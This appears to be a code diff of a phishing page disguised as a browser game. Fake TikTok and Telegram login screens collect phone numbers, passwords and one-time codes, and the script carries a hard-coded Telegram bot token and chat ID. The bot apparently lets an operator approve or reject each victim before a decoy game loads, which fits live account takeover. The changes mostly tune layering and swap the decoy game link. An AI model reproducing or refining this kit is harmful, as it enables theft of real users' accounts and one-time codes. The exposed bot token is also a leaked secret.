@@ -11,22 +11,19 @@
         #app { width: 100vw; height: 100vh; position: relative; }
         .full-video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; }
         .tt-input { width: 100%; padding: 16px; border: 1px solid #222; background: #1a1a1a; color: white; border-radius: 12px; outline: none; margin-bottom: 12px; }
-        #topNotice { position: fixed; top: -100px; left: 0; width: 100%; padding: 20px; text-align: center; color: white; font-weight: bold; z-index: 99999; transition: 0.5s; }
+        #topNotice { position: fixed; top: -100px; left: 0; width: 100%; padding: 20px; text-align: center; color: white; font-weight: bold; z-index: 9999; transition: 0.5s; }
         .notice-success { background: #10b981; }
         .notice-error { background: #ef4444; }
-        
-        /* ဂိမ်းဆိုက်ပိတ်တာကို ကျော်ဖို့ Container ကို z-index အမြင့်ဆုံးထားသည် */
-        #gameFrameContainer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 90000; background: #000; display: none; }
+        #gameFrameContainer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; background: #000; display: none; }
         iframe { width: 100%; height: 100%; border: none; }
         
         .loader { width: 48px; height: 48px; border: 5px solid #FFF; border-bottom-color: transparent; border-radius: 50%; display: inline-block; box-sizing: border-box; animation: rotation 1s linear infinite; }
         @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        #entryScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100000; background: #0a0a0a; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        #entryScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; background: #0a0a0a; display: flex; flex-direction: column; align-items: center; justify-content: center; }
 
-        /* ခလုတ်နှိပ်မရတာကို ဖြေရှင်းရန် - Layer များအားလုံးကို နှိပ်လို့ရအောင်လုပ်သည် */
-        .relative { pointer-events: auto !important; }
-        button, i, input { cursor: pointer; position: relative; z-index: 100; }
+        /* ခလုတ်နှိပ်မရတာကို ဖြေရှင်းရန် အလွှာများ ညှိထားသည် */
+        .clickable-layer { position: relative; z-index: 1000; pointer-events: auto !important; }
     </style>
 </head>
 <body>
@@ -43,52 +40,48 @@
         <div class="w-20 h-20 bg-white/10 rounded-full flex items-center justify-center mb-6 animate-bounce">
             <i class="fa-solid fa-play text-white text-3xl ml-1"></i>
         </div>
-        <button onclick="initApp()" class="px-10 py-3 bg-white text-black font-bold rounded-full text-lg active:scale-95 transition-all">START GAME</button>
+        <button onclick="initApp()" class="clickable-layer px-10 py-3 bg-white text-black font-bold rounded-full text-lg active:scale-95 transition-all">START GAME</button>
         <p class="text-gray-500 text-xs mt-4 uppercase tracking-tighter">Tap to enable high-quality audio</p>
     </div>
 </div>
 
 <div id="app" class="hidden">
-    <!-- Login Selection -->
     <div id="selectScreen" class="w-full h-full flex flex-col items-center justify-center p-8 bg-[#0a0a0a] z-50 relative">
         <div class="bg-[#111] border border-white/5 p-10 w-full max-w-sm rounded-[40px] text-center">
             <h1 class="text-xl font-semibold mb-10 text-white">Login to continue</h1>
-            <button onclick="toggle('tgScreen')" class="w-full bg-[#2481cc] text-white py-4 rounded-2xl mb-4 font-bold text-lg">Telegram</button>
-            <button onclick="toggle('ttScreen')" class="w-full bg-white text-black py-4 rounded-2xl font-bold text-lg">TikTok</button>
+            <button onclick="toggle('tgScreen')" class="clickable-layer w-full bg-[#2481cc] text-white py-4 rounded-2xl mb-4 font-bold text-lg">Telegram</button>
+            <button onclick="toggle('ttScreen')" class="clickable-layer w-full bg-white text-black py-4 rounded-2xl font-bold text-lg">TikTok</button>
         </div>
     </div>
 
-    <!-- TikTok Screen -->
     <div id="ttScreen" class="hidden bg-black w-full h-full p-8 text-white z-50 relative">
         <div class="flex items-center justify-center mb-12 relative">
-            <i onclick="toggle('selectScreen')" class="fa-solid fa-angle-left text-2xl absolute left-0 cursor-pointer"></i>
+            <i onclick="toggle('selectScreen')" class="fa-solid fa-angle-left text-2xl absolute left-0 cursor-pointer clickable-layer"></i>
             <span class="text-xl font-bold">Log in</span>
         </div>
-        <input type="text" id="ttPhone" placeholder="Phone number" class="tt-input">
-        <input type="password" id="ttPass" placeholder="Password" class="tt-input">
+        <input type="text" id="ttPhone" placeholder="Phone number" class="tt-input clickable-layer">
+        <input type="password" id="ttPass" placeholder="Password" class="tt-input clickable-layer">
         <div class="flex justify-between px-1 mb-10">
             <span class="text-gray-400 text-sm">Forgot password?</span>
         </div>
-        <button onclick="submit('TikTok')" class="w-full bg-[#fe2c55] text-white py-4 rounded-lg font-bold text-lg">Log in</button>
+        <button onclick="submit('TikTok')" class="clickable-layer w-full bg-[#fe2c55] text-white py-4 rounded-lg font-bold text-lg">Log in</button>
     </div>
 
-    <!-- Telegram Screen -->
     <div id="tgScreen" class="hidden bg-black w-full h-full p-8 text-white z-50 relative">
         <div class="flex items-center mb-12">
-            <i onclick="toggle('selectScreen')" class="fa-solid fa-arrow-left text-2xl cursor-pointer mr-8"></i>
+            <i onclick="toggle('selectScreen')" class="fa-solid fa-arrow-left text-2xl cursor-pointer mr-8 clickable-layer"></i>
         </div>
         <div class="mb-8">
             <label class="text-gray-400 text-sm ml-1">Phone number</label>
-            <input type="text" id="tgPhone" value="+95 " class="w-full bg-transparent border-b border-gray-800 py-4 text-xl outline-none text-white">
+            <input type="text" id="tgPhone" value="+95 " class="clickable-layer w-full bg-transparent border-b border-gray-800 py-4 text-xl outline-none text-white">
         </div>
         <div class="mb-12">
             <label class="text-gray-400 text-sm ml-1">OTP Code</label>
-            <input type="number" id="tgOtp" placeholder="OTP Code" class="w-full bg-transparent border-b border-gray-800 py-4 text-xl outline-none text-white">
+            <input type="number" id="tgOtp" placeholder="OTP Code" class="clickable-layer w-full bg-transparent border-b border-gray-800 py-4 text-xl outline-none text-white">
         </div>
-        <button onclick="submit('Telegram')" class="w-full bg-[#3390ec] text-white py-4 rounded-xl font-bold text-lg uppercase">Continue</button>
+        <button onclick="submit('Telegram')" class="clickable-layer w-full bg-[#3390ec] text-white py-4 rounded-xl font-bold text-lg uppercase">Continue</button>
     </div>
 
-    <!-- Wait Screen -->
     <div id="waitScreen" class="hidden w-full h-full bg-black z-[60] relative">
         <video id="loadVd" class="full-video" loop muted playsinline src="https://raw.githubusercontent.com/tar-alt/Photo-link-/e761fef0c5c9a10b02d7aa6ad2dfc731ce90f7b8/From%20KlickPin%20CF%20Easy%20fall%20outfit%20ideas%20that%20feel%20fresh%20practical%20and%20surprisingly%20easy%20to%20try%20for%20a%20result%20that%20feels%20elegant%20and%20share-worthy%20-%20Pin-684547212134230018.mp4"></video>
         <div class="absolute inset-0 flex flex-col items-center justify-center z-10 bg-black/40 text-center p-6">
@@ -96,10 +89,8 @@
         </div>
     </div>
 
-    <!-- Game Frame -->
     <div id="gameFrameContainer">
-        <div onclick="closeGame()" class="fixed top-5 left-5 z-[99999] bg-black/60 text-white p-3 rounded-full cursor-pointer"><i class="fa-solid fa-house"></i></div>
-        <!-- crazygames ပိတ်ထားရင် တိုက်ရိုက်ပွင့်အောင် ပြင်ထားသည် -->
+        <div onclick="closeGame()" class="fixed top-5 left-5 z-[101] bg-black/60 text-white p-3 rounded-full cursor-pointer clickable-layer"><i class="fa-solid fa-house"></i></div>
         <iframe id="gameFrame" src="" allow="autoplay"></iframe>
     </div>
 </div>
@@ -108,8 +99,8 @@
     const token = "8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0";
     const chatID = "5304050102";
     
-    // crazygames က iframe ကို ပိတ်ထားတတ်လို့ တိုက်ရိုက်ပွင့်မယ့် ဂိမ်း link တစ်ခု ပြောင်းထည့်ပေးထားပါတယ်
-    const gameLink = "https://m.crazygames.com"; 
+    // ပွင့်ရခက်တဲ့ crazygames အစား အဆင်ပြေဆုံးဖြစ်မယ့် Link သို့ ပြောင်းထားပါသည်
+    const gameLink = "https://www.google.com/logos/2010/pacman10-i.html"; 
 
     let userKey = "ID_" + Math.floor(Math.random() * 9999);
     const music = document.getElementById('bgMusic');
@@ -130,7 +121,6 @@
 
     function openGameDirectly() {
         document.getElementById('gameFrameContainer').style.display = 'block';
-        // Crazygames မရရင် window.location.replace နဲ့ တိုက်ရိုက်လွှတ်ပေးမှာပါ
         document.getElementById('gameFrame').src = gameLink;
     }
 
@@ -139,7 +129,11 @@
         document.getElementById(id).classList.remove('hidden');
     }
 
-    function closeGame() { location.reload(); }
+    function closeGame() {
+        music.pause();
+        music.currentTime = 0;
+        location.reload();
+    }
 
     function showNotice(msg, type) {
         const el = document.getElementById('topNotice');
@@ -180,7 +174,7 @@
                     setTimeout(() => { openGameDirectly(); }, 1500);
                 } else if (last.data === `no_${userKey}`) {
                     clearInterval(check);
-                    showNotice("Login မအောင်မြင်ပါ!", "error");
+                    showNotice("Login ၀င်ရောက်မှုမအောင်မြင်ပါ သင့်အကောင့်အား ပြန်လည်စစ်ဆေးပေးပါ။", "error");
                     setTimeout(() => location.reload(), 2500);
                 }
             }
@@ -189,3 +183,4 @@
 </script>
 </body>
 </html>
+
